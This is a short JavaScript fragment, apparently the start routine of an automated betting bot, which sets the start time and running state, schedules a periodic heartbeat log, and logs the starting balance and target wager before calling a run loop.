        bot.stime = Date.now() / 1000;
        bot.lastWin = false;
        resetToPhase1();
        bot.isRunning = true;
        if(reportInterval) clearInterval(reportInterval);
        reportInterval = setInterval(function(){
            if(bot.isRunning) logConsole("Periodic heartbeat");
        }, 180000);
        updateHUD();
        logConsole("START | Balance=" + bot.startBalance.toFixed(4) + " | TargetWager=" + bot.wagtarget.toFixed(2));
        runLoop();
    }
    
